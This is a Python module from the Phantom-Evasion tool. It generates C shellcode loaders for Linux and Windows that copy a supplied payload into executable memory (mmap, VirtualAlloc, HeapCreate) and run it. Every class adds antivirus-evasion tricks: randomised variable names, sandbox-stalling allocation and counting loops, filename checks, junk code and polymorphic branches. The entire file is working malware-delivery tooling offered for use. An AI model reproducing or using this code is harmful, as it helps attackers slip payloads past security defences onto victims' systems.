
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################
import random, string, sys 
from random import shuffle
from libs import randchar


class  MHA_mathinject_linux(object):
	def __init__(self, Payload, Filename):
		self.Payload, self.Filename = Payload, Filename
	def run(self):
		Randbufname = randchar.varname_creator()
		Payload = self.Payload.replace("buf",Randbufname)
		Randgood = randchar.varname_creator()
		Randmem = randchar.varname_creator()
		Randbig = random.randrange(60000000,120000000,1000000) 	
		Randmaxop = randchar.varname_creator()
		Randcpt = randchar.varname_creator()
		Randi = randchar.varname_creator()
		Randptr = randchar.varname_creator()
		Randinj = randchar.varname_creator()
		y = [[i] for i in range(1,6)]
		shuffle(y)
		aa = str(y[0])
		bb = str(y[1])
		cc = str(y[2])
		aa = aa.replace("[","")
		aa = aa.replace("]","")
		bb = bb.replace("[","")
		bb = bb.replace("]","")
		cc = cc.replace("[","")
		cc = cc.replace("]","")
		Junkcode1 = randchar.Junkmathinject(aa) 	        # Junkcode
		Junkcode2 = randchar.Junkmathinject(bb)		# Junkcode
		Junkcode3 = randchar.Junkmathinject(cc)		# Junkcode
		Hollow_code = ""
		Hollow_code += "#define " + Randgood + " " + str(Randbig) + "\n"
		Hollow_code += "#include <stdlib.h>\n#include <stdio.h>\n"
		Hollow_code += "#include <unistd.h>\n"
		Hollow_code += "#include <sys/mman.h>\n"
		Hollow_code += "#include <string.h>\n"
		Hollow_code += "int main(int argc,char * argv[]){\n"
		Hollow_code += "if (strstr(argv[0], \"" + self.Filename + "\") > 0){\n"
		Hollow_code += "char *" + Randmem + " = NULL;\n"
		Hollow_code += Randmem + " = (char *) malloc("+ Randgood + ");\n"
		Hollow_code += "if ("+ Randmem + "!=NULL){\n"
		Hollow_code += "memset(" + Randmem + ",00," + Randgood + ");\n"
		Hollow_code += "free(" + Randmem + ");\n"
		Hollow_code += "int " + Randcpt + "  = 0;\n"
		Hollow_code += "int " + Randi + " = 0;\n"
		Hollow_code += "for("+ Randi + " = 0;" + Randi + " < " + Randgood + "; " + Randi + "++){\n"
		Hollow_code += Randcpt + "++;}\n"
		Hollow_code += "if("+ Randcpt + " == " + Randgood + "){\n"
		Hollow_code += Payload
		Hollow_code += "void *" + Randptr + ";"
		Hollow_code += Randptr + " = mmap(0,sizeof(" + Randbufname + "),PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,-1,0);\n"
		Hollow_code += "memcpy(" + Randptr + ","+ Randbufname + ", sizeof(" + Randbufname + "));\n"
		Hollow_code += "int " + Randinj + " = ((int(*)(void))" + Randptr + ")();}\n"
		Hollow_code += "else{" + Junkcode1 + "}\n"
		Hollow_code += "}else{" + Junkcode2 + "}\n"
		Hollow_code += "}else{" + Junkcode3 + "}\n"
		Hollow_code += "return 0;}"
		Hollow_code = Hollow_code.encode('utf-8')
		return Hollow_code

class MHA_mathinject_windows(object):
	def __init__(self, Payload, Filename):
		self.Payload, self.Filename = Payload, Filename
	def run(self):
		Randbufname = randchar.varname_creator()
		Payload = self.Payload.replace("buf",Randbufname)
		Randgood = randchar.varname_creator()
		Randmem = randchar.varname_creator()
		Randbig = random.randrange(60000000,120000000,1000000) 		
		Randmaxop = randchar.varname_creator()
		Randcpt = randchar.varname_creator()
		Randi = randchar.varname_creator()
		Randlpv = randchar.varname_creator()
		Randhand = randchar.varname_creator()
		Randresult = randchar.varname_creator()
		Randthread = randchar.varname_creator()
		Randheapvar = randchar.varname_creator()
		y = [[i] for i in range(1,6)]
		shuffle(y)
		aa = str(y[0])
		bb = str(y[1])
		cc = str(y[2])
		aa = aa.replace("[","")
		aa = aa.replace("]","")
		bb = bb.replace("[","")
		bb = bb.replace("]","")
		cc = cc.replace("[","")
		cc = cc.replace("]","")
		Junkcode1 = randchar.Junkmathinject(aa)# Junkcode
		Junkcode2 = randchar.Junkmathinject(bb)# Junkcode
		Junkcode3 = randchar.Junkmathinject(cc)# Junkcode
		Hollow_code = ""
		Hollow_code += "#define " + Randgood + " " + str(Randbig) + "\n"
		Hollow_code += "#include <windows.h>\n"
		Hollow_code += "#include <stdio.h>\n"
		Hollow_code += "#include <string.h>\n"
		Hollow_code += "int main(int argc,char * argv[]){\n"
		Hollow_code += "if (strstr(argv[0], \"" + self.Filename + ".exe\") > 0){\n"
		Hollow_code += "char *" + Randmem + " = NULL;\n"
		Hollow_code += Randmem + " = (char *) malloc("+ Randgood + ");\n"
		Hollow_code += "if ("+ Randmem + "!=NULL){\n"
		Hollow_code += "memset(" + Randmem + ",00," + Randgood + ");\n"
		Hollow_code += "free(" + Randmem + ");\n"
		Hollow_code += "int " + Randcpt + "  = 0;\n"
		Hollow_code += "int " + Randi + " = 0;\n"
		Hollow_code += "for("+ Randi + " = 0;" + Randi + " < " + Randgood + "; " + Randi + "++){\n"
		Hollow_code += Randcpt + "++;}\n"
		Hollow_code += "if("+ Randcpt + " == " + Randgood + "){\n"
		Hollow_code += "HANDLE " + Randheapvar + ";LPVOID " + Randlpv + ";HANDLE " + Randhand + ";DWORD " + Randresult + ";DWORD " + Randthread + ";\n"
		Hollow_code += Payload
		Hollow_code += Randheapvar + " = HeapCreate(0x00040000, strlen(" + Randbufname + "), 0);\n"
		Hollow_code += Randlpv + " = HeapAlloc(" + Randheapvar + ", 0x00000008, strlen(" + Randbufname + "));\n"
		Hollow_code += "RtlMoveMemory(" + Randlpv +","+ Randbufname + ",strlen(" + Randbufname + "));\n"
		Hollow_code += Randhand + " = CreateThread(NULL,0," + Randlpv + ",NULL,0,&"+ Randthread + ");\n"
		Hollow_code += Randresult + " = WaitForSingleObject(" + Randhand + ",-1);}\n" 
		Hollow_code += "else{" + Junkcode1 + "}\n"
		Hollow_code += "}else{" + Junkcode2 + "}\n"
		Hollow_code += "}else{" + Junkcode3 + "}\n"
		Hollow_code += "return 0;}"
		Hollow_code = Hollow_code.encode('utf-8')
		
		return Hollow_code

class HVA_mathinject_windows(object):
	def __init__(self, Payload, Filename):
		self.Payload, self.Filename = Payload, Filename
	def run(self):
		Randbufname = randchar.varname_creator()
		Payload = self.Payload.replace("buf",Randbufname)
		Randgood = randchar.varname_creator()
		Randmem = randchar.varname_creator()
		Randbig = random.randrange(60000000,120000000,1000000) 		
		Randmaxop = randchar.varname_creator()
		Randcpt = randchar.varname_creator()
		Randi = randchar.varname_creator()
		Randlpv = randchar.varname_creator()
		Randhand = randchar.varname_creator()
		Randresult = randchar.varname_creator()
		Randthread = randchar.varname_creator()
		y = [[i] for i in range(1,6)]
		shuffle(y)
		aa = str(y[0])
		bb = str(y[1])
		cc = str(y[2])
		aa = aa.replace("[","")
		aa = aa.replace("]","")
		bb = bb.replace("[","")
		bb = bb.replace("]","")
		cc = cc.replace("[","")
		cc = cc.replace("]","")

		Junkcode1 = randchar.Junkmathinject(aa) 		        # Junkcode
		Junkcode2 = randchar.Junkmathinject(bb)				# Junkcode
		Junkcode3 = randchar.Junkmathinject(cc)				# Junkcode

		Hollow_code = ""
		Hollow_code += "#define " + Randgood + " " + str(Randbig) + "\n"
		Hollow_code += "#include <windows.h>\n"
		Hollow_code += "#include <stdio.h>\n"
		Hollow_code += "#include <string.h>\n"
		Hollow_code += "int main(int argc,char * argv[]){\n"
		Hollow_code += "if (strstr(argv[0], \"" + self.Filename + ".exe\") > 0){"
		Hollow_code += "char *" + Randmem + " = NULL;\n"
		Hollow_code += Randmem + " = (char *) malloc(" + Randgood + ");\n"
		Hollow_code += "if ("+ Randmem + "!=NULL){\n"
		Hollow_code += "memset(" + Randmem + ",00," + Randgood + ");\n"
		Hollow_code += "free(" + Randmem + ");\n"
		Hollow_code += "int " + Randcpt + "  = 0;\n"
		Hollow_code += "int " + Randi + " = 0;\n"
		Hollow_code += "for("+ Randi + " = 0;" + Randi + " < " + Randgood + "; " + Randi + "++){\n"
		Hollow_code += Randcpt + "++;}\n"
		Hollow_code += "if("+ Randcpt + " == " + Randgood + "){\n"
		Hollow_code += Payload
		Hollow_code += "LPVOID " + Randlpv + ";" + "HANDLE " + Randhand + ";" + "DWORD " + Randresult + ";" + "DWORD " + Randthread + ";"
		Hollow_code += Randlpv + " = VirtualAlloc(NULL, strlen(" + Randbufname + "),0x3000,0x40);\n"
		Hollow_code += "RtlMoveMemory(" + Randlpv +","+ Randbufname + ",strlen(" + Randbufname + "));\n"
		Hollow_code += Randhand + " = CreateThread(NULL,0," + Randlpv + ",NULL,0,&"+ Randthread + ");\n"
		Hollow_code += Randresult + " = WaitForSingleObject(" + Randhand + ",-1);}\n" 
		Hollow_code += "else{" + Junkcode1 + "}\n"
		Hollow_code += "}else{" + Junkcode2 + "}\n"
		Hollow_code += "}else{" + Junkcode3 + "}\n"
		Hollow_code += "return 0;}"
		Hollow_code = Hollow_code.encode('utf-8')
		return Hollow_code

class Polymorphic_MHA_mathinject_linux(object):
	def __init__(self, Payload, Filename):
		self.Payload, self.Filename = Payload, Filename
	def run(self):
		Filename = self.Filename
		Randbufname = randchar.varname_creator()
		Payload = self.Payload.replace("buf",Randbufname)
		Randgood = randchar.varname_creator()
		Randmem = randchar.varname_creator()
		Randbig = random.randrange(60000000,120000000,1000000) 		
		Randmaxop = randchar.varname_creator()
		Randcpt = randchar.varname_creator()
		Randi = randchar.varname_creator()
		Randptr = randchar.varname_creator()
		Randinj = randchar.varname_creator()
		x = [[i] for i in range(1,5)]
		shuffle(x)
		a = str(x[0])
		b = str(x[1])
		c = str(x[2])
		a = a.replace("[","")
		a = a.replace("]","")
		b = b.replace("[","")
		b = b.replace("]","")
		c = c.replace("[","")
		c = c.replace("]","")
		y = [[i] for i in range(1,6)]
		shuffle(y)
		aa = str(y[0])
		bb = str(y[1])
		cc = str(y[2])
		aa = aa.replace("[","")
		aa = aa.replace("]","")
		bb = bb.replace("[","")
		bb = bb.replace("]","")
		cc = cc.replace("[","")
		cc = cc.replace("]","")

		MorphEvasion1 = str(randchar.Polymorph_Multipath_Evasion(a,Filename))
		MorphEvasion2 = str(randchar.Polymorph_Multipath_Evasion(b,Filename))
		MorphEvasion3 = str(randchar.Polymorph_Multipath_Evasion(c,Filename))
		MorphEvasion1 = MorphEvasion1.replace(".exe","")
		MorphEvasion2 = MorphEvasion2.replace(".exe","")
		MorphEvasion3 = MorphEvasion3.replace(".exe","")
		Junkcode1 = randchar.Junkmathinject(aa) 		        # Junkcode
		Junkcode2 = randchar.Junkmathinject(bb)				# Junkcode
		Junkcode3 = randchar.Junkmathinject(cc)				# Junkcode

		Hollow_code = ""
		Hollow_code += "#include <stdlib.h>\n#include <stdio.h>\n"
		Hollow_code += "#include <unistd.h>\n"
		Hollow_code += "#include <sys/mman.h>\n"
		Hollow_code += "#include <string.h>\n"
		Hollow_code += "int main(int argc,char * argv[]){\n"
		Hollow_code += MorphEvasion1
		Hollow_code += MorphEvasion2
		Hollow_code += MorphEvasion3
		Hollow_code += Payload
		Hollow_code += "void *" + Randptr + ";"
		Hollow_code += Randptr + " = mmap(0,sizeof(" + Randbufname + "),PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,-1,0);\n"
		Hollow_code += "memcpy(" + Randptr + ","+ Randbufname + ", sizeof(" + Randbufname + "));\n"
		Hollow_code += "int " + Randinj + " = ((int(*)(void))" + Randptr + ")();}\n"
		Hollow_code += "else{" + Junkcode1 + "}\n"
		Hollow_code += "}else{" + Junkcode2 + "}\n"
		Hollow_code += "}else{" + Junkcode3 + "}\n"
		Hollow_code += "return 0;}"
		Hollow_code = Hollow_code.encode('utf-8')
		return Hollow_code

class Polymorphic_MHA_mathinject_windows(object):
	def __init__(self, Payload, Filename):
		self.Payload, self.Filename = Payload, Filename
	def run(self):
		Filename = self.Filename
		Randbufname = randchar.varname_creator()
		Payload = self.Payload.replace("buf",Randbufname)
		Randgood = randchar.varname_creator()
		Randmem = randchar.varname_creator()
		Randbig = random.randrange(60000000,120000000,1000000) 		
		Randmaxop = randchar.varname_creator()
		Randcpt = randchar.varname_creator()
		Randi = randchar.varname_creator()
		Randlpv = randchar.varname_creator()
		Randhand = randchar.varname_creator()
		Randresult = randchar.varname_creator()
		Randthread = randchar.varname_creator()
		Randheapvar = randchar.varname_creator()
		x = [[i] for i in range(1,5)]
		shuffle(x)
		a = str(x[0])
		b = str(x[1])
		c = str(x[2])
		a = a.replace("[","")
		a = a.replace("]","")
		b = b.replace("[","")
		b = b.replace("]","")
		c = c.replace("[","")
		c = c.replace("]","")

		y = [[i] for i in range(1,6)]

		shuffle(y)
		aa = str(y[0])
		bb = str(y[1])
		cc = str(y[2])
		aa = aa.replace("[","")
		aa = aa.replace("]","")
		bb = bb.replace("[","")
		bb = bb.replace("]","")
		cc = cc.replace("[","")
		cc = cc.replace("]","")

		MorphEvasion1 = str(randchar.Polymorph_Multipath_Evasion(a,Filename))
		MorphEvasion2 = str(randchar.Polymorph_Multipath_Evasion(b,Filename))
		MorphEvasion3 = str(randchar.Polymorph_Multipath_Evasion(c,Filename))
 
		Junkcode1 = randchar.Junkmathinject(aa) 		        # Junkcode
		Junkcode2 = randchar.Junkmathinject(bb)				# Junkcode
		Junkcode3 = randchar.Junkmathinject(cc)				# Junkcode


		Hollow_code = ""
		Hollow_code += "#include <windows.h>\n"
		Hollow_code += "#include <stdio.h>\n"
		Hollow_code += "#include <string.h>\n"
		Hollow_code += "int main(int argc,char * argv[]){\n"
		Hollow_code += MorphEvasion1
		Hollow_code += MorphEvasion2
		Hollow_code += MorphEvasion3
		Hollow_code += "HANDLE " + Randheapvar + ";LPVOID " + Randlpv + ";HANDLE " + Randhand + ";DWORD " + Randresult + ";DWORD " + Randthread + ";\n"
		Hollow_code += Payload
		Hollow_code += Randheapvar + " = HeapCreate(0x00040000, strlen(" + Randbufname + "), 0);\n"
		Hollow_code += Randlpv + " = HeapAlloc(" + Randheapvar + ", 0x00000008, strlen(" + Randbufname + "));\n"
		Hollow_code += "RtlMoveMemory(" + Randlpv +","+ Randbufname + ",strlen(" + Randbufname + "));\n"
		Hollow_code += Randhand + " = CreateThread(NULL,0," + Randlpv + ",NULL,0,&"+ Randthread + ");\n"
		Hollow_code += Randresult + " = WaitForSingleObject(" + Randhand + ",-1);}\n" 
		Hollow_code += "else{" + Junkcode1 + "}\n"
		Hollow_code += "}else{" + Junkcode2 + "}\n"
		Hollow_code += "}else{" + Junkcode3 + "}\n"
		Hollow_code += "return 0;}"
		Hollow_code = Hollow_code.encode('utf-8')
		return Hollow_code

class Polymorphic_MVA_mathinject_windows(object):
	def __init__(self, Payload, Filename):
		self.Payload, self.Filename = Payload, Filename
	def run(self):
		Filename = self.Filename
		Randbufname = randchar.varname_creator()
		Payload = self.Payload.replace("buf",Randbufname)
		Randgood = randchar.varname_creator()
		Randmaxop = randchar.varname_creator()
		Randcpt = randchar.varname_creator()
		Randi = randchar.varname_creator()
		Randlpv = randchar.varname_creator()
		Randhand = randchar.varname_creator()
		Randresult = randchar.varname_creator()
		Randthread = randchar.varname_creator()
		x = [[i] for i in range(1,5)]
		shuffle(x)
		a = str(x[0])
		b = str(x[1])
		c = str(x[2])
		a = a.replace("[","")
		a = a.replace("]","")
		b = b.replace("[","")
		b = b.replace("]","")
		c = c.replace("[","")
		c = c.replace("]","")

		y = [[i] for i in range(1,6)]

		shuffle(y)
		aa = str(y[0])
		bb = str(y[1])
		cc = str(y[2])
		aa = aa.replace("[","")
		aa = aa.replace("]","")
		bb = bb.replace("[","")
		bb = bb.replace("]","")
		cc = cc.replace("[","")
		cc = cc.replace("]","")

		MorphEvasion1 = str(randchar.Polymorph_Multipath_Evasion(a,Filename))
		MorphEvasion2 = str(randchar.Polymorph_Multipath_Evasion(b,Filename))
		MorphEvasion3 = str(randchar.Polymorph_Multipath_Evasion(c,Filename))
 
		Junkcode1 = randchar.Junkmathinject(aa) 		        # Junkcode
		Junkcode2 = randchar.Junkmathinject(bb)				# Junkcode
		Junkcode3 = randchar.Junkmathinject(cc)				# Junkcode

		Hollow_code = ""
		Hollow_code += "#include <windows.h>\n"
		Hollow_code += "#include <stdio.h>\n"
		Hollow_code += "#include <string.h>\n"
		Hollow_code += "int main(int argc,char * argv[]){\n"
		Hollow_code += MorphEvasion1
		Hollow_code += MorphEvasion2
		Hollow_code += MorphEvasion3
		Hollow_code += Payload
		Hollow_code += "LPVOID " + Randlpv + ";" + "HANDLE " + Randhand + ";" + "DWORD " + Randresult + ";" + "DWORD " + Randthread + ";\n"
		Hollow_code += Randlpv + " = VirtualAlloc(NULL, strlen(" + Randbufname + "),0x3000,0x40);\n"
		Hollow_code += "RtlMoveMemory(" + Randlpv +","+ Randbufname + ",strlen(" + Randbufname + "));\n"
		Hollow_code += Randhand + " = CreateThread(NULL,0," + Randlpv + ",NULL,0,&"+ Randthread + ");\n"
		Hollow_code += Randresult + " = WaitForSingleObject(" + Randhand + ",-1);}\n" 
		Hollow_code += "else{" + Junkcode1 + "}\n"
		Hollow_code += "}else{" + Junkcode2 + "}\n"
		Hollow_code += "}else{" + Junkcode3 + "}\n"
		Hollow_code += "return 0;}"
		Hollow_code = Hollow_code.encode('utf-8')
		
		return Hollow_code
